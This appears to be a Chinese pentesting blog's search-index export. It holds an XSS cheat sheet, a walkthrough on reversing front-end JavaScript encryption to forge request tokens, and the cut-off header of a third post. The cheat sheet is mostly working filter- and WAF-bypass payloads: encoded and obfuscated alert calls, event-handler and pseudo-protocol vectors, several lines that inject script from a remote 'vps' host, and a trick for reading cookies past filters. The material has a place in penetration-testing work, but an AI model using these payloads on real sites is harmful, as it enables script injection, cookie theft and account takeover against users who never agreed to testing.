<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[XSS Cheat Sheet]]></title>
    <url>%2F2019%2F10%2F24%2Fxss-tips-payloads%2F</url>
    <content type="text"><![CDATA[如果碰到没遇到或者不知道的，建议大家先Google、看文档。 首先大家可以先看下这个网站： https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 如果测试的时候在这个网站上找不到可以利用的方法的话，那…emmm…就放弃吧。 下面是我在工作中常用的一些方法，全部都来自网络上的各个表哥的无私分享，我先替我自己说声谢谢了。 1. 拼接拼接函数： 1top、this、self、parent、frames、content、window 比如： 1234567&lt;body/onfocus=top.alert(1)&gt;&lt;body onpageshow=top['confir'%2b'm'](1)&gt;&lt;audio src/onerror=self['pro'+'mpt'](1)&gt;&lt;details ontoggle=this['ale'+'rt']`1` open&gt;&lt;marquee onstart=top.eval('ale'%2B'rt(1)')&gt;&lt;img/src=1 onerror=window.alert(1)&gt;&lt;svg onload="a(this);function a()&#123;&#125;(alert`1`)"&gt; 2. 编码常见的编码类型：URL编码、base64编码、Hex编码、JS8编码、JS16编码、Unicode编码、html编码 既然是编码肯定需要一些函数来执行，比如：eval，setTimeout，setInterval，constructor，execScript(IE)等 1234567891011121314151617181920212223# URL&lt;img src="x" onerror="eval(unescape('%61%6c%65%72%74%28%31%29'))"&gt;&lt;details open ontoggle=eval('%61%6c%65%72%74%28%31%29') &gt;&lt;details open ontoggle=%65%76%61%6c(atob('YWxlcnQoMSk=')) &gt;# base64&lt;details open ontoggle=eval(atob('YWxlcnQoMSk='))&gt;# JS8&lt;body onpageshow=content['\141\154\145\162\164'](1)&gt;&lt;svg/onload=setTimeout('\141\154\145\162\164\50\61\51')&gt;# JS16&lt;body onpageshow=frames['\x61\x6c\x65\x72\x74'](1)&gt;&lt;svg/onload=Set.constructor`al\x65rt\x281\x29```&gt;&lt;svg/onload=Map.constructor`al\x65rt\x281\x29```&gt;&lt;svg/onload=clear.constructor`al\x65rt\x281\x29```&gt;&lt;svg/onload=Array.constructor`al\x65rt\x281\x29```&gt;&lt;svg/onload=WeakSet.constructor`al\x65rt\x281\x29```&gt;# unicode&lt;a href="javascript:al\u0065rt()"&gt;XSS Test&lt;/a&gt;&lt;a href="javascript:al\u&#123;65&#125;rt()"&gt;XSS Test&lt;/a&gt;&lt;svg/onload=\u0073etInterval('\141\154\145\162\164\50\61\51')&gt;&lt;svg/onload=setTimeout`prompt\u00281\u0029`&gt;# Ascii&lt;img/src=1 onerror="eval(String.fromCharCode(97,108,101,114,116,40,49,41))"&gt; 3. 字符串利用正则表达式返回字符串 12345eval('~a~le~rt~~(~~1~~)~'.replace(/~/g, ''))eval(/~a~le~rt~~(~~1~~)~/.source.replace(/~/g, new String()))&lt;a href="javascript:window[/alert/.source]()"&gt;XSS Test&lt;/a&gt;&lt;a href="javascript:''.replace(/.*/,alert)"&gt;XSS Test&lt;/a&gt;&lt;img src=1 onerror=eval('~a~le~rt~~(~~1~~)~'.replace(/~/g, ''))&gt; 利用toString转换字符串。 整数toString(radix)转字符串, 第一个点表示浮点数，第二个点表示调用函数 123&lt;a href="javascript:top[8680439..toString(30)]()"&gt;XSS Test&lt;/a&gt;&lt;details open ontoggle=top[8680439..toString(30)](1); &gt;&lt;details open ontoggle=top[11189117..toString(32)](1); &gt; alert字符串用parseInt函数，以基数为30转化后为8680439 parseInt(&#39;alert&#39;,30) == 8680439 toString函数将返回的数字8680439，以基数为30还原 8680439..toString(30) == alert 4. 函数多样调用123456789101112131415&lt;a href="javascript:alert.call(null,'param')"&gt;XSS Test&lt;/a&gt;&lt;a href="javascript:alert.apply(null,['param'])"&gt;XSS Test&lt;/a&gt;&lt;a href="javascript:alert.bind()('param')"&gt;XSS Test&lt;/a&gt;&lt;a href="javascript:Reflect.apply(alert,null,['param'])"&gt;XSS Test&lt;/a&gt;&lt;a href="javascript:setTimeout`alert\x28\x29`"&gt;XSS Test&lt;/a&gt;&lt;a href="javascript:eval(atob())"&gt;XSS Test&lt;/a&gt;&lt;a href="javascript:eval(String.fromCharCode(97,108,))"&gt;XSS Test&lt;/a&gt;&lt;img src=1 onerror=(function()&#123;alert(1)&#125;)()&gt;&lt;img src=1 onerror=!function()&#123;alert(1)&#125;()&gt;&lt;img src=1 onerror=%2bfunction()&#123;alert(1)&#125;()&gt;&lt;img src=1 onerror=%2dfunction()&#123;alert(1)&#125;()&gt;&lt;img src=1 onerror=~function()&#123;alert(1)&#125;()&gt;&lt;a href="javascript:(alert)()"&gt;XSS Test&lt;/a&gt;模板字符串：反引号``&lt;a href="javascript:`$&#123;alert(1)&#125;`"&gt;XSS Test&lt;/a&gt; 5. 利用数组等的功能函数123456&lt;a href="javascript:[''].find(alert`1`)"&gt;XSS Test&lt;/a&gt;&lt;a href="javascript:[''].findIndex(alert(1)"&gt;XSS Test&lt;/a&gt;&lt;a href="javascript:[''].filter(alert)"&gt;XSS Test&lt;/a&gt;&lt;a href="javascript:[''].forEach(alert)"&gt;XSS Test&lt;/a&gt;&lt;a href="javascript:(new Map()).set(1,'').forEach(alert)"&gt;XSS Test&lt;/a&gt;&lt;a href="javascript:(new Set([''])).forEach(alert)"&gt;XSS Test&lt;/a&gt; 利用拼接数组函数 concat()不仅仅可以用于连接两个或多个数组，还可以合并两个或者多个字符串 12&lt;svg/onload=location='javas'.concat('cript:ale','rt(1)')&gt;&lt;iframe onload=s=createElement('script');body.appendChild(s);s.src='http://v'.\u0063oncat('ps/','js'); &gt; 再补充个有些防护过滤了document.cookie可以试下下面的，很爽的 1document['coo'['CONCAT'.toLowerCase()]('kie')] join()将数组转换成字符串 1&lt;iframe onload=location=['javascript:alert(1)'].join(")&gt; 6. 新建函数12345&lt;a href="javascript:(new Function('alert()'))()"&gt;XSS Test&lt;/a&gt;&lt;body/onload=Function(alert(1))()&gt;&lt;img%0Dsrc=1 onerror=Function(alert(1))&gt;&lt;a href="javascript:Set.constructor`alert\x28\x29```"&gt;XSS Test&lt;/a&gt;&lt;a href="javascript:(new (Object.getPrototypeOf(async function()&#123;&#125;).constructor)('alert()'))()"&gt;XSS Test&lt;/a&gt; 7. locationlocation对象的hash属性用于设置或取得 URL 中的锚部分，比如：http://localhost/1.php#alert(1)，我们在控制台输入location.hash，则会返回我们设定的锚，即#alert(1)。 再结合slice()、substr()等字符串处理函数获取字符串 123456&lt;body/onload=eval(location.hash.slice(1))&gt;#alert(1)&lt;body/onload=setTimeout(location.hash.substr(1))()&gt;#alert(1)&lt;body/onload=Set.constructor(location.hash.substr(1))()&gt;#alert(1)&lt;body/onload=execScript(location.hash.substr(1))&gt;#alert(1)使用Function匿名函数来执行尾部的代码&lt;body/onload=Function(location.hash.slice(1))()&gt;#alert(1) 同样的道理location.search也类似，它可以把部分参数放在?之后 123456789101112# dom.html&lt;html&gt; &lt;body&gt; &lt;script&gt; document.write(decodeURI(window.location.search)); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;# payloaddom.html?&lt;svg/onload=alert(1)1.php?(1)&amp;code=&lt;img/src=1 onerror=a=location.search;location="javascript:alert"+a[1]+a[2]+a[3]&gt; 再比如： 1&lt;svg onload=eval(URL.slice(-8))&gt;#alert(1) 9. 伪协议常见的伪协议有：javascript:，vbscript:(IE下)，data: 1234567891011121314&lt;body/onload=eval(location.hash.slice(1))&gt;#javascript:alert(1)&lt;body/onload=eval(location.hash.slice(1))&gt;#vbscript:msgbox(1)&lt;a href="javascript:confirm(1)"&gt;XSS Test&lt;/a&gt;&lt;iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(1)"&gt;&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4="&gt;&lt;iframe/src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4="&gt;&lt;video&gt;&lt;source onerror="javascript:confirm(1);"&gt;&lt;img src=1 onerror=location="javascript:alert(1)"&gt;# 使用xmlns属性&lt;svg/onload="javascript:alert(1)" xmlns="http://www.baidu.com"&gt;# 使用注释&lt;svg/onload=location='javascript:/*'%2blocation.hash&gt; #*/alert(1)# innerHTML&lt;svg/onload=location="javascript:"%2binnerHTML%2blocation.hash&gt;" #"-alert(1) 10. unescapeunescape()函数用于对已经使用escape()函数编码的字符串进行解码，并返回解码后的字符串。 很多会拦截外部url，比如拦截// 1&lt;svg/onload=appendChild(createElement('script')).src=unescape('http%3A%2F%2Fxss.tt%2F1te')&gt; 11. withwith用来引用某个特定对象中已有的属性，使用with可以实现通过节点名称的对象调用。 如果.被拦截，可以使用with替代。 1&lt;svg/onload=with(location)with(hash)eval(alert(1))&gt; 基于DOM的方法创建和插入节点把外部JS文件注入到网页中，也可以应用with。 1&lt;svg/onload="[1].find(function()&#123;with(`docom'|e|'nt`);;body.appendChild(createElement('script')).src='http://vps/js'&#125;)"&gt; 12. 过滤括号12345&lt;svg/onload="window.onerror=eval;throw'=alert\x281\x29';"&gt;&lt;img/src=1 onerror="top.onerror=alert; throw 1"&gt;&lt;img src=x onerror=alert`1`&gt;&lt;img src=1 onerror=alert%28%29&gt;&lt;img src=1 onerror=location="javascript:"+"aler"+"t%281%29"&gt; 13. 引用外部url创建和插入节点把外部JS文件注入到网页 12345&lt;details open ontoggle=eval("appendChild(createElement('script')).src='http://vps/js'")&gt;&lt;iframe onload=s=createElement('script');body.appendChild(s);s.src='http://v'.concat('ps/','js');&gt;&lt;body/onload=document.write(String.fromCharCode(60,115,67,114,73,112,116,32,115,114,67,61,104,116,116,112,58,47,47,118,112,115,47,106,115,62,60,47,115,67,82,105,112,84,62))&gt;利用link&lt;link rel=import href="http://vps/1.js"&gt; 14. 赋值1234567891011# 变量&lt;img/src=1 onerror=_=alert,_(1)&gt;&lt;style onload=_=alert;_(1)&gt;&lt;details/open/ontoggle=_=alert;x=1;_`1`&gt;&lt;details open ontoggle=top[a='al',b='ev',b%2ba](prompt(1))&gt;&lt;details open ontoggle=top[a='al',b='ev',b%2ba]('\141\154\145\162\164\50\61\51')&gt;&lt;details open ontoggle=top[a='meout',b='setTi',b%2ba]('\141\154\145\162\164\50\61\51')&gt;# 函数&lt;img/src=1 onmouseover="a=alert,a`1`"&gt;# 属性&lt;img src=1 alt=al lang=ert onerror=top[alt%2blang](1)&gt; 15. 黑名单以alert(1)为例 12345678(alert)(1)a=alert,a(1)[1].find(alert)top["al"+"ert"](1)self[/al/.source+/ert/.source](1)al\u0065rt(1)frames['al\145rt'](1)content[8680439..toString(30)](1) 16. 标签16.1. body123456&lt;body onload=alert(1)&gt;&lt;body onpageshow=alert(1)&gt;&lt;body onfocus=alert(1)&gt;&lt;body onhashchange=alert(1)&gt;&lt;a href=#&gt;&lt;/a&gt;&lt;body style=overflow:auto;height:1000px onscroll=alert(1) id=x&gt;#x&lt;body onscroll=alert(1)&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;x id=x&gt;#x 16.2. 其他123456789&lt;marquee onstart=alert(1)&gt;&lt;marquee loop=1 width=0 onfinish=alert(1)&gt;&lt;audio src onloadstart=alert(1)&gt;&lt;video onloadstart=alert(1)&gt;&lt;source&gt;&lt;input autofocus onblur=alert(1)&gt;&lt;keygen autofocus onfocus=alert(1)&gt;&lt;form onsubmit=alert(1)&gt;&lt;input type=submit&gt;&lt;select onchange=alert(1)&gt;&lt;option&gt;1&lt;option&gt;2&lt;menu id=x contextmenu=x onshow=alert(1)&gt;right click me! 太多了，再次提醒大家好好看看这个网站： https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 17. 事件捕获12345678910111213141516171819202122232425262728293031323334353637383940&lt;x contenteditable onblur=alert(1)&gt;lose focus!&lt;x onclick=alert(1)&gt;click this!&lt;x oncopy=alert(1)&gt;copy this!&lt;x oncontextmenu=alert(1)&gt;right click this!&lt;x oncut=alert(1)&gt;copy this!&lt;x ondblclick=alert(1)&gt;double click this!&lt;x ondrag=alert(1)&gt;drag this!&lt;x contenteditable onfocus=alert(1)&gt;focus this!&lt;x contenteditable oninput=alert(1)&gt;input here!&lt;x contenteditable onkeydown=alert(1)&gt;press any key!&lt;x contenteditable onkeypress=alert(1)&gt;press any key!&lt;x contenteditable onkeyup=alert(1)&gt;press any key!&lt;x onmousedown=alert(1)&gt;click this!&lt;x onmousemove=alert(1)&gt;hover this!&lt;x onmouseout=alert(1)&gt;hover this!&lt;x onmouseover=alert(1)&gt;hover this!&lt;x onmouseup=alert(1)&gt;click this!&lt;x contenteditable onpaste=alert(1)&gt;paste here!&lt;brute contenteditable onblur=alert(1)&gt;lose focus!&lt;brute onclick=alert(1)&gt;click this!&lt;brute oncopy=alert(1)&gt;copy this!&lt;brute oncontextmenu=alert(1)&gt;right click this!&lt;brute oncut=alert(1)&gt;copy this!&lt;brute ondblclick=alert(1)&gt;double click this!&lt;brute ondrag=alert(1)&gt;drag this!&lt;brute contenteditable onfocus=alert(1)&gt;focus this!&lt;brute contenteditable oninput=alert(1)&gt;input here!&lt;brute contenteditable onkeydown=alert(1)&gt;press any key!&lt;brute contenteditable onkeypress=alert(1)&gt;press any key!&lt;brute contenteditable onkeyup=alert(1)&gt;press any key!&lt;brute onmousedown=alert(1)&gt;click this!&lt;brute onmousemove=alert(1)&gt;hover this!&lt;brute onmouseout=alert(1)&gt;hover this!&lt;brute onmouseover=alert(1)&gt;hover this!&lt;brute onmouseup=alert(1)&gt;click this!&lt;brute contenteditable onpaste=alert(1)&gt;paste here!&lt;brute style=font-size:500px onmouseover=alert(1)&gt;0000&lt;brute style=font-size:500px onmouseover=alert(1)&gt;0001&lt;brute style=font-size:500px onmouseover=alert(1)&gt;0002&lt;brute style=font-size:500px onmouseover=alert(1)&gt;0003 18. 属性1234567891011121314151617181920212223242526# src&lt;script src=javascript:alert(1)&gt;&lt;iframe src=javascript:alert(1)&gt;&lt;embed src=javascript:alert(1)&gt;# href&lt;a href=javascript:alert(1)&gt;click&lt;math&gt;&lt;brute href=javascript:alert(1)&gt;click# action&lt;form action=javascript:alert(1)&gt;&lt;input type=submit&gt;&lt;isindex action=javascript:alert(1) type=submit value=click&gt;# formaction&lt;form&gt;&lt;button formaction=javascript:alert(1)&gt;click&lt;form&gt;&lt;input formaction=javascript:alert(1) type=submit value=click&gt;&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image value=click&gt;&lt;form&gt;&lt;input formaction=javascript:alert(1) type=image src=http://brutelogic.com.br/webgun/img/youtube1.jpg&gt;&lt;isindex formaction=javascript:alert(1) type=submit value=click&gt;# data&lt;object data=javascript:alert(1)&gt;# srcdoc&lt;iframe srcdoc=%26lt;svg/o%26%23x6Eload%26equals;alert%26lpar;1)%26gt;&gt;# xlink:href&lt;svg&gt;&lt;script xlink:href=data:,alert(1)&gt;&lt;/script&gt;&lt;svg&gt;&lt;script xlink:href=data:,alert(1) /&gt;&lt;math&gt;&lt;brute xlink:href=javascript:alert(1)&gt;click# from&lt;svg&gt;&lt;a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?&gt;&lt;circle r=400 /&gt;&lt;animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=%26&gt; 渗透测试常见利用手法 XSS + CSRF XSS + 文件上传 XSS + SSRF XSS + DOS XSS + RCE XSS + NTLMhash XSS + 文件读取 。。。 案例我已经字字血泪的帮大家都整理好了，自取。 渗透测试之XSS漏洞利用案例大全(尊享版)： https://ml.mk/Tjc Fuzz字典公众号回复xss获取 文章来源：https://github.com/S9MF/Xss_Test/ https://xz.aliyun.com/t/1126 https://bbs.kafan.cn/thread-1686598-1-1.html http://www.anquan.us/static/drops/papers-894.html http://www.anquan.us/static/drops/papers-938.html http://www.vulnerability-lab.com/resources/documents/531.txt https://randywestergren.com/persistent-xss-verizons-webmail-client/ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection https://blog.csdn.net/haoren_xhf/article/details/83060293 https://lorexxar.cn/2017/08/23/xss-tuo/ https://xz.aliyun.com/t/4886 https://www.anquanke.com/post/id/180187 https://github.com/TheKingOfDuck/easyXssPayload http://avfisher.win/archives/871 https://paper.seebug.org/344/]]></content>
      <tags>
        <tag>XSS</tag>
        <tag>WAF绕过</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试 | 突破前端JS加密限制]]></title>
    <url>%2F2019%2F09%2F08%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8BJS%E9%80%86%E5%90%91%2F</url>
    <content type="text"><![CDATA[前言现在前端开发为了提高爬虫的难度及加强安全性，都会在数据包提交前进行加密，最典型的就是传参加密，相信大家在测试的时候都遇到过，那么我们在抓取数据包并修改之后，修改之后的参数无法通过后端程序数据完整性的校验，就无法进行进一步测试。如果我们逆向解析出加密的过程，就可以模拟出相同的密文，通过后端接口的校验。 最近由于工作需要，在搜索资料的时候，学到了很多爬虫大佬们的关于JS逆向、APK逆向、代码分析等方面的经验和技巧，后续会分部分记录并总结下来。 0x01 常见加密算法比较简单的base64、hex等这些编码就不再说了。 1.1 对称加密（加解密的密钥相同） 常用算法：DES、DES3、AES 根据密钥长度不同又分为：AES-128、AES-192、AES-256 其中AES-192和AES-256在Java中使用需获取无政策限制权限文件 加密/解密使用相同的密钥 加密和解密的过程是可逆的 1.2 非对称加密（加解密密钥为公钥和私钥） 常用算法：RSA 使用公钥加密，使用私钥解密 公钥是公开的，私钥保密 加密处理安全，但是性能极差，单次加密长度有限制 RSA既可用于数据交换，也可用于数据校验 数据校验通常结合消息摘要算法 MD5withRSA 等 12345两种加密算法常见结合套路：1、随机生成密钥2、密钥用于AES/DES/3DES加密数据3、RSA对密钥加密4、提交加密后的密钥和加密后的数据给服务器 1.3 信息摘要算法/签名算法 常用算法：MD5、HMAC（HmacMD5、HmacSHA1、HmacSHA256）、SHA（SHA1、SHA256、SHA512） 不管明文多长，散列后的密文定长 明文不一样，散列后结果一定不一样 散列后的密文不可逆 一般用于校验数据完整性、签名 sign 由于密文不可逆，所以后台无法还原，也就是说他要验证，会在后台以跟前台一样的方式去重新签名一遍。也就是说他会把源数据和签名后的值一起提交到后台。所以我们要保证在签名时候的数据和提交上去的源数据一致，这种算法特喜欢在内部加入时间戳 0x02 JS逆向流程以登录为例的基本流程： 如果网页有跳转，必须勾选preserve log（F12-Network）防止丢包 看一下有没有框架，右键查看框架源代码(弹出式登陆界面) 登陆尽量使用错误密码，防止跳转 查看关键登陆包，分析哪些参数是加密的 使用别的浏览器分析哪些参数是固定的值 初步猜测加密的方法 搜索 直接搜索参数，比如：pwd=，pwd =，pwd:，pwd : 密码框地方右键 检查 查看 id name type 找到加密的地方(重点) 进行代码调试 找出所有的加密代码 从最后一步开始写起，缺啥找啥 如果找的是函数的话，search 要带上 function xxx 如果看到加密的地方有个类，并且之后是用 prototype 把方法加在原生对象上的话，要把 所有加在原生对象上的方法都找出来 函数找多了没关系，只要不报错不会影响结果，但是不能找少了 0x03 实例操作打开网站，抓包 修改个数据，比如修改num为1000 有些杠精该说了：我渗透测试改这有毛用。 是没用，只是以此为例。。。 可以看到，修改过参数数据后，后端数据校验之后不合法，所以没有返回数据。 打开测试网站 -&gt; F12控制台 -&gt; 切换至 XHR 这里我们看下需要做的有什么？ 请求中有token（t明显是时间戳），token和数据不匹配后端不返回数据 返回的数据是加密的，需要解密 接下来我们就定位具体的加密函数和解密函数。 按照上面提到的流程步骤 打开控制台 -&gt; source -&gt;搜索 搜索加密参数名 token 根据搜索结果的文件名判断，基本上就是第二个文件，点击打开 token的生成代码 1var token = md5(String(page) + String(num) + String(timestamp)); 设置断点，刷新 成功进入断点，没毛病了 根据加密函数，编写脚本 可以看到，生成的token和URL中的一致，至此，加密部分完成。 解密部分同样的道理，搜索返回包中的参数，直接搜索list发现有点多，不太好观察，还有一种方法 可以看到数据部分html的id为ip-list，再次搜索 成功找到解密数据包的代码 设置断点，进一步确认 没毛病，可以看到decode_str后就开始出现我们需要的明文数据了，所以这里的 decode_str 就是我们要的解密方法。剩下就是分析代码，编写解密脚本了。 1234567891011function decode_str(scHZjLUh1) &#123; scHZjLUh1 = Base64["\x64\x65\x63\x6f\x64\x65"](scHZjLUh1); key = '\x6e\x79\x6c\x6f\x6e\x65\x72'; len = key["\x6c\x65\x6e\x67\x74\x68"]; code = ''; for (i = 0; i &lt; scHZjLUh1["\x6c\x65\x6e\x67\x74\x68"]; i++) &#123; var coeFYlqUm2 = i % len; code += window["\x53\x74\x72\x69\x6e\x67"]["\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65"](scHZjLUh1["\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74"](i) ^ key["\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74"](coeFYlqUm2)) &#125; return Base64["\x64\x65\x63\x6f\x64\x65"](code)&#125; 先运行下看看 报错，提示Base64未定义，设置断点，找到Base64的具体代码 复制粘贴进代码，再次运行 艹，提示Windows未定义，根据流程，缺啥补啥，debug，找对应的值 可以看到分别对应的是String和fromCharCode 那就是调用了String.fromCharCode方法了，替换掉，再次运行 bingo～ 成功解密获取到明文数据。 0x04 Python实现加密方法合集关于上述第一部分的常见加密算法，GitHub有对应的仓库，直接可以用的 GitHub：https://github.com/dhfjcuff/R-A-M-D-D3-S-M-H/ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262# -*- coding：utf-8 -*-import base64import rsafrom Crypto.Cipher import AESfrom Crypto.PublicKey import RSAfrom pyDes import des, CBC, PAD_PKCS5from Crypto.Cipher import DES3import hashlibimport hmacclass USE_AES: """ AES 除了MODE_SIV模式key长度为：32, 48, or 64, 其余key长度为16, 24 or 32 详细见AES内部文档 CBC模式传入iv参数 本例使用常用的ECB模式 """ def __init__(self, key): if len(key) &gt; 32: key = key[:32] self.key = self.to_16(key) def to_16(self, key): """ 转为16倍数的bytes数据 :param key: :return: """ key = bytes(key, encoding="utf8") while len(key) % 16 != 0: key += b'\0' return key # 返回bytes def aes(self): return AES.new(self.key, AES.MODE_ECB) # 初始化加密器 def encrypt(self, text): aes = self.aes() return str(base64.encodebytes(aes.encrypt(self.to_16(text))), encoding='utf8').replace('\n', '') # 加密 def decodebytes(self, text): aes = self.aes() return str(aes.decrypt(base64.decodebytes(bytes( text, encoding='utf8'))).rstrip(b'\0').decode("utf8")) # 解密class USE_RSA: """ 生成密钥可保存.pem格式文件 1024位的证书，加密时最大支持117个字节，解密时为128； 2048位的证书，加密时最大支持245个字节，解密时为256。 加密大文件时需要先用AES或者DES加密，再用RSA加密密钥，详细见文档 文档:https://stuvel.eu/files/python-rsa-doc/usage.html#generating-keys """ def __init__(self, number=1024): """ :param number: 公钥、私钥 """ self.pubkey, self.privkey = rsa.newkeys(number) def rsaEncrypt(self, text): """ :param test: str :return: bytes """ content = text.encode('utf-8') crypto = rsa.encrypt(content, self.pubkey) return crypto def rsaDecrypt(self, text): """ :param text:bytes :return: str """ content = rsa.decrypt(text, self.privkey) con = content.decode('utf-8') return con def savePem(self, path_name, text): """ :param path_name: 保存路径 :param text: str :return:bytes """ if "PEM" in path_name.upper(): path_name = path_name[:-4] with open('&#123;&#125;.pem'.format(path_name), 'bw') as f: f.write(text.save_pkcs1()) def readPem(self, path_name, key_type): """ :param path_name: 密钥文件 :param key_type:类型 :return: """ if 'pubkey' in key_type: self.pubkey = rsa.PublicKey.load_pkcs1(path_name) else: self.privkey = rsa.PublicKey.load_pkcs1(path_name) return True def sign(self, message, priv_key=None, hash_method='SHA-1'): """ 生成明文的哈希签名以便还原后对照 :param message: str :param priv_key: :param hash_method: 哈希的模式 :return: """ if None == priv_key: priv_key = self.privkey return rsa.sign(message.encode(), priv_key, hash_method) def checkSign(self, mess, result, pubkey=None): """ 验证签名：传入解密后明文、签名、公钥，验证成功返回哈希方法，失败则报错 :param mess: str :param result: bytes :param pubkey: :return: str """ if None == pubkey: pubkey = self.privkey try: result = rsa.verify(mess, result, pubkey) return result except: return Falseclass USE_DES: """ des(key,[mode], [IV], [pad], [pad mode]) key:必须正好8字节 mode（模式）：ECB、CBC iv:CBC模式中必须提供长8字节 pad:填充字符 padmode:加密填充模式PAD_NORMAL or PAD_PKCS5 """ def __init__(self, key, iv): if not isinstance(key, bytes): key = bytes(key, encoding="utf8") if not isinstance(iv, bytes): iv = bytes(iv, encoding="utf8") self.key = key self.iv = iv def encrypt(self, text): """ DES 加密 :param text: 原始字符串 :return: 加密后字符串，bytes """ if not isinstance(text, bytes): text = bytes(text, "utf-8") secret_key = self.key iv = self.iv k = des(secret_key, CBC, iv, pad=None, padmode=PAD_PKCS5) en = k.encrypt(text, padmode=PAD_PKCS5) return en def descrypt(self, text): """ DES 解密 :param text: 加密后的字符串，bytes :return: 解密后的字符串 """ secret_key = self.key iv = self.iv k = des(secret_key, CBC, iv, pad=None, padmode=PAD_PKCS5) de = k.decrypt(text, padmode=PAD_PKCS5) return de.decode()class USE_DES3: """ new(key, mode, *args, **kwargs) key:必须8bytes倍数介于16-24 mode： iv:初始化向量适用于MODE_CBC、MODE_CFB、MODE_OFB、MODE_OPENPGP，4种模式 ``MODE_CBC``, ``MODE_CFB``, and ``MODE_OFB``长度为8bytes ```MODE_OPENPGP```加密时8bytes解密时10bytes 未提供默认随机生成 nonce：仅在 ``MODE_EAX`` and ``MODE_CTR``模式中使用 ``MODE_EAX``建议16bytes ``MODE_CTR``建议[0, 7]长度 未提供则随机生成 segment_size：分段大小，仅在 ``MODE_CFB``模式中使用，长度为8倍数，未指定则默认为8 mac_len： 适用``MODE_EAX``模式，身份验证标记的长度（字节），它不能超过8（默认值） initial_value：适用```MODE_CTR```，计数器的初始值计数器块。默认为**0**。 """ def __init__(self, key): self.key = key self.mode = DES3.MODE_ECB def encrypt(self, text): """ 传入明文 :param text:bytes类型，长度是KEY的倍数 :return: """ if not isinstance(text, bytes): text = bytes(text, 'utf-8') x = len(text) % 8 text = text+b'\0'*x cryptor = DES3.new(self.key, self.mode) ciphertext = cryptor.encrypt(text) return ciphertext def decrypt(self, text): cryptor = DES3.new(self.key, self.mode) plain_text = cryptor.decrypt(text) st = str(plain_text.decode("utf-8")).rstrip('\0') return stdef USE_MD5(test): if not isinstance(test, bytes): test = bytes(test, 'utf-8') m = hashlib.md5() m.update(test) return m.hexdigest()def USE_HMAC(key, text): if not isinstance(key, bytes): key = bytes(key, 'utf-8') if not isinstance(text, bytes): text = bytes(text, 'utf-8') h = hmac.new(key, text, digestmod='MD5') return h.hexdigest()def USE_SHA(text): if not isinstance(text, bytes): text = bytes(text, 'utf-8') sha = hashlib.sha1(text) encrypts = sha.hexdigest() return encryptsif __name__ == '__main__': aes_test = USE_AES("assssssssdfasasasasa") a = aes_test.encrypt("测试") b = aes_test.decodebytes(a) rsa_test = USE_RSA() a = rsa_test.rsaEncrypt("测试加密") b = rsa_test.rsaDecrypt(a) des_test = USE_DES(b"12345678", b"12345678") a = des_test.encrypt("测试加密") b = des_test.descrypt(a) des3_test = USE_DES3(b"123456789qazxswe") a = des3_test.encrypt("测试加密") b = des3_test.decrypt(a) md5_test = USE_MD5("测试签名") hmac_test = USE_HMAC("123456", "测试") sha_test = USE_SHA("测试加密") 参考资料公众号：咸鱼学python 公众号：小周码字]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>前端</tag>
        <tag>JS加密</tag>
        <tag>抓包</tag>
        <tag>JS逆向</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试之业务流量通用抓包方法]]></title>
    <url>%2F2019%2F08%2F20%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%B8%9A%E5%8A%A1%E6%B5%81%E9%87%8F%E9%80%9A%E7%94%A8%E6%8A%93%E5%8C%85%E6%96%B9%E6%B3%95%2F</url>
